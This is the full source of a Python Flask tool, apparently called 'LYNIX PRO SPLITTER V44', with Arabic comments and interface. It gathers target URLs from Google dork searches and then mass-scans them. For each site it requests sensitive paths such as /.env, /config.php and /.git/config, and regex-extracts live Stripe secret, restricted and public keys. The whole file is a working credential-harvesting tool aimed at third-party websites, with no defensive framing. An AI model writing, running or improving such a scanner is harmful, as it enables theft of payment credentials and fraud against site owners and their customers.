import requests
import re
from flask import Flask, render_template_string, request, jsonify
from googlesearch import search
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin

app = Flask(__name__)

# أنماط البحث الشاملة عن مفاتيح Stripe
STRIPE_PATTERNS = {
    "Secret Key": r"sk_live_[a-zA-Z0-9]{24,}",
    "Public Key": r"pk_live_[a-zA-Z0-9]{24,}",
    "Restricted Key": r"rk_live_[a-zA-Z0-9]{24,}"
}

# المسارات التي سيتم فحصها "شبر شبر"
PATHS_TO_CHECK = ['/', '/.env', '/config.php', '/js/app.js', '/settings.json', '/.git/config']

def deep_scan(url):
    results = []
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0'}
    
    for path in PATHS_TO_CHECK:
        try:
            target = urljoin(url, path)
            res = requests.get(target, headers=headers, timeout=5, verify=False)
            if res.status_code == 200:
                for label, pattern in STRIPE_PATTERNS.items():
                    matches = re.findall(pattern, res.text)
                    for m in matches:
                        results.append({"type": label, "key": m, "path": path})
        except: continue
    return results

@app.route('/')
def index():
    return render_template_string(HTML_UI)

# الجزء الأول: محرك البحث عن المواقع
@app.route('/dork_search', methods=['POST'])
def dork_search():
    dork = request.json.get('dork')
    links = []
    try:
        # جلب الروابط (إذا حظرك جوجل، ستحتاج لاستخدام VPN أو البحث يدوياً ولصق الروابط)
        for url in search(dork, num_results=50):
            links.append(url)
        return jsonify({"status": "success", "links": links})
    except Exception as e:
        return jsonify({"status": "error", "message": "Google Blocked the server. Please paste links manually."})

# الجزء الثاني: الفاحص العميق
@app.route('/mass_scan', methods=['POST'])
def mass_scan():
    urls = request.json.get('urls', [])
    final_data = []
    
    with ThreadPoolExecutor(max_workers=15) as executor:
        future_to_url = {executor.submit(deep_scan, url): url for url in urls}
        for future in future_to_url:
            url = future_to_url[future]
            try:
                keys = future.result()
                if keys: final_data.append({"url": url, "keys": keys})
            except: pass
            
    return jsonify({"status": "success", "data": final_data})

HTML_UI = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>LYNIX PRO SPLITTER V44</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .section { border: 1px solid #0f0; padding: 20px; margin-bottom: 20px; background: #050505; border-radius: 10px; }
        textarea { width: 98%; height: 150px; background: #111; color: #fff; border: 1px solid #333; margin: 10px 0; padding: 10px; }
        button { padding: 12px 25px; cursor: pointer; font-weight: bold; background: #0f0; color: #000; border: none; }
        .res-box { background: #000; border: 1px solid #222; padding: 10px; font-size: 13px; height: 300px; overflow-y: scroll; }
        .key { color: yellow; font-weight: bold; }
    </style>
</head>
<body>
    <h1>[ LYNIX PRO SPLITTER V44 ]</h1>

    <div class="section">
        <h2>1️⃣ محرك البحث (Dork Sniper)</h2>
        <input type="text" id="dorkInput" placeholder="ضع الـ Dork هنا..." style="width:70%; padding:10px;">
        <button onclick="runDork()">استخراج المواقع 🔎</button>
        <textarea id="linksArea" placeholder="الروابط المستخرجة ستظهر هنا، يمكنك التعديل عليها أو إضافة روابط من عندك..."></textarea>
    </div>

    <div class="section">
        <h2>2️⃣ الفاحص العميق (Deep Mass Scan)</h2>
        <button onclick="runScanner()" style="background: white;">بدء الفحص الشامل لجميع الروابط أعلاه ⚡</button>
        <div id="scanStatus" style="margin-top:10px;"></div>
        <div class="res-box" id="scanResults">نتائج الفحص ستظهر هنا...</div>
    </div>

    <script>
        async function runDork() {
            const dork = document.getElementById('dorkInput').value;
            const area = document.getElementById('linksArea');
            area.value = "⏳ جاري محاولة جلب الروابط من جوجل (قد يتم الحظر من قبل جوجل)...";
            
            const res = await fetch('/dork_search', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ dork: dork })
            });
            const data = await res.json();
            if(data.status === "success") area.value = data.links.join('\\n');
            else area.value = "❌ حظرك جوجل. يرجى نسخ الروابط يدوياً من المتصفح ولصقها هنا.";
        }

        async function runScanner() {
            const urls = document.getElementById('linksArea').value.split('\\n').filter(u => u.trim() !== "");
            const resBox = document.getElementById('scanResults');
            const status = document.getElementById('scanStatus');
            
            status.innerHTML = "⏳ جاري فحص " + urls.length + " موقع شبر شبر...";
            resBox.innerHTML = "";

            const response = await fetch('/mass_scan', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ urls: urls })
            });
            const result = await response.json();
            
            status.innerHTML = "✅ اكتمل الفحص!";
            if(result.data.length === 0) resBox.innerHTML = "لم يتم العثور على مفاتيح مكشوفة في هذه القائمة.";
            else {
                result.data.forEach(item => {
                    let keysHtml = item.keys.map(k => `<br> - <span class='key'>[${k.type}]</span> ${k.key} (في: ${k.path})`).join('');
                    resBox.innerHTML += `<div style='border-bottom:1px solid #333; padding:10px;'>
                        <span style='color:#00bcff;'>[URL]: ${item.url}</span> ${keysHtml}
                    </div>`;
                });
            }
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
